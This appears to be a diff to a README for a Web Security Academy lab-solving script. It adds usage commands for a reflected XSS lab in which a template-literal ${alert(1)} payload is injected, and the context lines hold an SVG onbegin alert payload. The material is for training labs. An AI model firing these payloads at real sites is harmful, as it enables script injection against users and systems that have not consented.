@@ -59,3 +59,11 @@ No proxy:
 
 Proxy:
 - `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<svg><animatetransform onbegin=alert('XSS') attributeName=transform>" -p 127.0.0.1:8080`
+
+### 7. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+No proxy:
+- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\${alert(1)}"`
+
+Proxy:
+- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "\${alert(1)}" -p 127.0.0.1:8080`
